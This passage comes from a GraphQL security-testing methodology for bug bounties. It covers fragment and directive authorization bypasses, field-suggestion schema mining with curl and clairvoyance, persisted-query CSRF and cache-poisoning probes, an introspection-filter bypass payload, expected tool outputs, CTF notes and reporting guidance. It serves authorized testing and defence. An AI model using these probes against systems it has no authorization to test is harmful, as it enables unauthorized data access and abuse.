                                    query { ...F }  fragment F on Query { secretReport { data } }
```

  If the fragment form returns data the direct form denies, the authorization validation rule is node-incomplete. This is also a denylist/WAF dodge (Supplement S3 above): a filter matching the literal field name never sees it inside a fragment.

- **`@skip`/`@include` as an authz oracle and a scrub-evasion.** Never a control in themselves — but two abuses. First, response-shape differencing: `{ me { isAdmin @include(if: $probe) } }` toggled across `$probe=true/false` reveals whether a field *exists and resolves* for your principal without the field ever appearing in a denied response, useful when direct selection is blocked but the validator still processes the conditional. Second, some auth validation rules *skip* the auth check when a field is statically excluded (`@include(if:false)` / `@skip(if:true)`); if the exclusion is computed from a variable the rule can't fold at validation time, the check may be skipped at validate-time yet the field still resolved at execute-time — probe variable-driven `@skip`/`@include` on guarded fields and compare validate-time vs returned data.

- **Client-supplied custom directives.** If introspection shows a custom directive like `@auth(requires: Role)` that is *executable* (usable in a query document, not schema-only), try supplying or overriding its arguments in your operation — `someField @auth(requires: USER)` — and see if the server honors the client value. Security directives must be schema-only; a client-writable one is a logic bypass. Enumerate them from `__schema{ directives{ name args{ name } locations isRepeatable } }` and test every non-built-in entry.

### T5. Field-suggestion mining when introspection is off (extends Phase 1.4 / Phase 3)

Phase 1.4 names clairvoyance and the "Did you mean" hint; here is the mechanism and, crucially, how to tell when it is *closed*. graphql-js builds suggestions with an internal `suggestionList` (Levenshtein over real schema names) and emits them in validation errors **independently of introspection** — disabling introspection (`NoSchemaIntrospectionCustomRule`, `@envelop/disable-introspection`, `NODE_ENV=production` on Apollo) does **not** silence suggestions. So a target with introspection off but suggestions on is still fully mappable one field at a time:

```bash
# typo a field; the error names the real neighbours
curl -s -X POST https://example.com/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{ usrr(id:1){ id } }"}'
# -> "Cannot query field \"usrr\" on type \"Query\". Did you mean \"user\" or \"users\"?"
curl -s -X POST https://example.com/graphql -H 'Content-Type: application/json' \
  -d '{"query":"{ user(id:1){ passwrd } }"}'
# -> "Cannot query field \"passwrd\" on type \"User\". Did you mean \"password\" or \"passwordHash\"?"   <- staff-only field named for free
```

clairvoyance automates exactly this; expected run and output:

```bash
clairvoyance -o schema.json -w wordlist.txt https://example.com/graphql
# [INFO] Fetored ... Starting blind introspection
# [INFO] Found new type: User / Query / Mutation ...
# [INFO] Adding field 'password' to type 'User'
# -> schema.json (GraphiQL/Voyager/inql-compatible) reconstructed without a single __schema query
```

Feed clairvoyance the Escape graphql-wordlist entity names plus app-specific guesses and hashcat-masked candidates (Phase 1.4). **The control that closes this:** `graphql-armor` / Hive Gateway `blockFieldSuggestions`, Yoga/Apollo error-formatter scrubbing, or a custom validation rule that strips "Did you mean" text. If your typo probe returns a bare `Cannot query field "usrr"` with no suggestion *and* introspection is off, reconstruction is down to pure wordlist brute force — slower, noisier, and usually not worth it under low-volume rules; say so and pivot to JS-bundle/persisted-query mining (Phase 1.4) instead.

### T6. Persisted queries / APQ — quirks beyond the safelist bypass (extends Phase 1.4)

Phase 1.4 covers the headline: APQ is a cache, not a safelist, so a hash-miss → full-query resend usually executes and caches arbitrary documents. Three further quirks:

- **APQ over GET is a CSRF + filter-bypass channel.** The register-and-execute flow works as a GET: `?extensions={"persistedQuery":{"version":1,"sha256Hash":"<h>"}}&query=<url-encoded>`. That makes a state-changing operation reachable from a cross-site `<img>`/link (combine with the Phase 4 mutations-over-GET check), and it slips any introspection/denylist filter that inspects only JSON POST bodies.
- **Hash-mismatch handling.** Send `extensions.persistedQuery.sha256Hash` that does **not** match the accompanying `query`. Correct servers reject with `ProvidedSha256HashOfQueryDoesNotMatch` (Apollo) / `PersistedQueryHashMismatch`. A server that caches the document under the attacker-chosen hash anyway is a cache-poisoning primitive: a later victim request carrying that hash gets *your* document. Probe once with a benign mismatch and read the error class — a mismatch that still returns `data` is the finding.
- **Distinguish APQ from a true safelist.** Automatic persisted queries (client-registrable) ≠ an operation safelist / persisted-query list built at deploy time (server-registrable only). If an unknown hash returns `PersistedQueryNotFound` **and** a full-query resend is rejected (`PersistedQueryNotFound` persists, or `operation not in safelist`), the server is safelisting — the write surface is frozen to pre-registered operations; note it and stop testing arbitrary documents on that endpoint.

### T7. Expected tool outputs (pins Appendix A names to what you should see)

Appendix A lists the tools; here is what a successful run prints, so an agent can branch on it:

```bash
# graphw00f — engine + version fingerprint
graphw00f -d -f -t https://example.com/graphql
# [*] Checking if GraphQL is available...
# [!] Found GraphQL at https://example.com/graphql
# [*] Attempting to fingerprint...
# [!] Discovered GraphQL Engine: (Apollo)     <- or (Graphene)/(graphql-java)/(Hasura)/(Ruby)...
# [*] Attack Surface Matrix: https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/apollo.md

# graphql-cop — misconfiguration suite (JSON for machine parsing)
python3 graphql-cop.py -t https://example.com/graphql -o json
# [HIGH] Introspection Query Enabled (Information Leakage)
# [HIGH] Alias Overloading (Potential DoS)
# [HIGH] Batch Queries (Potential DoS / brute-force amplification)
# [LOW]  Field Suggestions Enabled (Information Leakage)
# [MEDIUM] GET Method Query (Possible CSRF)

# inql — schema extraction + ready-to-fire query generation
inql -t https://example.com/graphql -o out/
# writes out/<host>/schema.json, plus query/ and mutation/ dirs of pre-built documents
# with sane default variables per type — paste straight into Repeater/Intruder
```

Read these as a decision tree: graphw00f's engine string selects the Phase 6 CVE rows and the Threat Matrix page; graphql-cop's `Introspection ... Enabled` greenlights T1/clairvoyance-not-needed; `Field Suggestions Enabled` greenlights T5 even if introspection later turns out blocked; `Batch Queries`/`Alias Overloading` greenlight the T2 capped proof; `GET Method Query` greenlights Phase 4.3 + T6 CSRF framing.

### T8. CTF notes — what the lab teaches and what a bounty adds

GraphQL is a staple of web-security labs and CTF boxes because the attack surface is legible and self-contained. The classic patterns and how real engagements differ:

- **"Introspect, then call the hidden thing."** The intended path on most GraphQL CTF levels: introspection is open, you dump the schema, and a root field never exposed in the UI (`getFlag`, `adminPanel`, `user(id:1){ flag }`, `debug { env }`) hands you the win. PortSwigger's *Accessing private GraphQL posts* lab is this shape — introspection reveals `postPassword` on a hidden post. **Bounty delta:** finding the hidden field is step one of five; you still need a principal who *shouldn't* read it (Phase 2/3), an evidence pair, and impact framing. A hidden-but-properly-authorized field is not a bug.
- **Introspection disabled → suggestions/clairvoyance.** PortSwigger's *Finding a hidden GraphQL endpoint* blocks `__schema` naively; a newline after the keyword (`query{__schema%0a{...}}`) or the `__type(name:)` single-type form gets through (Phase 1.4 / Supplement S3). **Bounty delta:** same technique, but the regex-bypass itself is only Info unless it leads to data.
- **Alias brute force beats the rate limiter.** PortSwigger's *Bypassing rate limits via aliases* packs many `login`/2FA attempts into one document. In the lab you fire hundreds of aliases freely. **Bounty delta:** this is exactly the T2 line — cap the aliases, prove the ceiling, compute the amplification, and *do not* run the full stuffing attack on a live program.
- **Mutation-over-GET CSRF.** Labs delete `carlos` via a single GET link. **Bounty delta:** prove a *fresh, reversible* side effect (Phase 4.3), check the real cookie `SameSite` policy (Phase 5.3) before claiming CSRF, and restore state.
- **CTF-only shortcuts that don't transfer:** flags sit in a single intended field, so over-collection is free and there is no rules-of-engagement clock; schemas are small and fully reachable; one path is *meant* to work. A real target has thousands of fields, a program scope, and a prohibition on the flooding that CTFs reward — the discipline in this document is precisely the part the lab never makes you practice.

### T9. Reporting and evidence capture (new — mirrors the house reporting section)

The report is the product; structure every GraphQL finding the same way:

1. **Title — impact first, with the operation.** "Any authenticated user reads any other user's `passwordHash` via `node(id:)` (BOLA on the `Node` refetch resolver)" beats "IDOR in GraphQL."
2. **Preconditions.** Two accounts (A attacker, B victim), minimal privilege; the exact endpoint and transport (POST+JSON unless the finding *is* the alternate channel).
3. **PoC — one operation per step.** The single request, the variables, expected vs actual. Include the identity in the captured headers; a GraphQL response body is meaningless without the principal that sent it. Keep aliases/batches at the capped proof size (T2), never the full attack.
4. **Evidence.** The request+response *pair* (Phase rules of engagement). Redact other users' PII to the minimum the proof needs; for BOLA, one foreign record is proof, a dump is over-collection. Delete test accounts and restore any state a mutation changed.
5. **Remediation — root-cause, GraphQL-specific.** Point at the pattern: resolver-level ownership check (not middleware-only auth) for BOLA/node; `response_model`-style field allowlists or schema-level `@auth` applied to *all* AST node kinds (T4) for over-exposure; introspection off **and** `blockFieldSuggestions` (T5) for schema-leak; graphql-armor / Apollo operation limits (max depth, max aliases, cost, max batch) for Phase 5/6; a persisted-query **safelist** (not bare APQ, T6) for the write surface.

Severity rules of thumb, mapped to the Phase triage table: cross-account read of private fields — High; cross-account write / privileged mutation reachable by a normal user — Critical; field over-exposure of secrets — Medium–High; resolver injection to a DB/OS sink — High; alias/batch rate-limit bypass on an auth or money flow — Medium–High (High if it defeats 2FA/credential throttling); missing depth/complexity limit — Medium (report the absent control + the measured growth curve, per T3); introspection/suggestions/IDE exposure — Info–Low, an enabler you cite inside the higher finding rather than filing alone. Cross-reference OWASP API Security Top 10 (2023): API1 BOLA (Phase 2, 2.4, T1 diff), API3 BOPLA (Phase 3 over-exposure, T4 directive smuggling), API5 BFLA (Phase 4 mutations), API4 Unrestricted Resource Consumption (Phase 6, T2, T3), API8 Security Misconfiguration (Phase 0, introspection/suggestions/APQ).

### References (Supplement 3)

- CVE-2025-31496, apollo-compiler named-fragment validation DoS (fixed 1.27.0) — https://nvd.nist.gov/vuln/detail/CVE-2025-31496
- GHSA-94hh-jmq8-2fgp / CVE-2025-32032, Apollo Router query-planner thread-pool exhaustion (fixed 1.61.2 / 2.1.1) — https://nvd.nist.gov/vuln/detail/CVE-2025-32032
- CVE-2025-59845, Apollo Embedded Sandbox/Explorer CSRF via `postMessage` origin-validation bypass (fixed @apollo/sandbox 2.7.2, @apollo/explorer 3.7.3; GHSA-w87v-7w53-wwxv) — https://nvd.nist.gov/vuln/detail/CVE-2025-59845
- CVE-2024-40094, graphql-java introspection ENF DoS (fixed 21.5 / 20.9 / 19.11; GHSA-h9mq-f6q5-6c8m) — https://nvd.nist.gov/vuln/detail/CVE-2024-40094
- CVE-2023-26144, graphql-js `OverlappingFieldsCanBeMergedRule` resource consumption (fixed 16.8.1) — https://nvd.nist.gov/vuln/detail/CVE-2023-26144
- graphql-js `NoSchemaIntrospectionCustomRule` (disables introspection, not suggestions) — https://graphql-js.org/api/function/NoSchemaIntrospectionCustomRule
- `get_introspection_query` (graphql-core) — https://graphql-core-3.readthedocs.io/en/latest/
- Hive Gateway `blockFieldSuggestions` / suggestion leakage — https://the-guild.dev/graphql/hive/docs/gateway/other-features/security/disable-introspection
- `@envelop/disable-introspection` — https://the-guild.dev/graphql/envelop/plugins/use-disable-introspection
- Directive-based logic bypass (auth directive checked on Field nodes only) — https://instatunnel.substack.com/p/directive-deception-exploiting-custom
- graphql-dotnet/authorization: auth rule skips excluded `@skip`/`@include` fields (PR #30) — https://github.com/graphql-dotnet/authorization/pull/30
- GraphQL spec, `@skip`/`@include` evaluation — https://spec.graphql.org/draft/
- graphw00f — https://github.com/dolevf/graphw00f
- graphql-cop — https://github.com/dolevf/graphql-cop
- clairvoyance — https://github.com/nikitastupin/clairvoyance
- PortSwigger GraphQL labs (hidden endpoint, private fields, rate-limit via aliases, CSRF) — https://portswigger.net/web-security/graphql
- Apollo Automatic Persisted Queries (APQ protocol + hash semantics) — https://www.apollographql.com/docs/apollo-server/performance/apq

*Supplement 3 added 2026-11-19. Sources: NVD/GHSA primary advisories (CVE-2025-31496, CVE-2025-32032, CVE-2025-59845, CVE-2024-40094, CVE-2023-26144, all re-verified against the issuing advisory on this date); graphql-js, graphql-core, Apollo, and The Guild documentation for tool/control syntax; PortSwigger Web Security Academy GraphQL labs for CTF patterns. Model: claude-opus-4-8. Preserves all prior content; appends surface-mining depth, the alias/batch low-volume discipline, DoS-as-report framing, the directive-authz class, field-suggestion mining, persisted-query quirks, expected tool outputs, CTF notes, and the reporting block.*
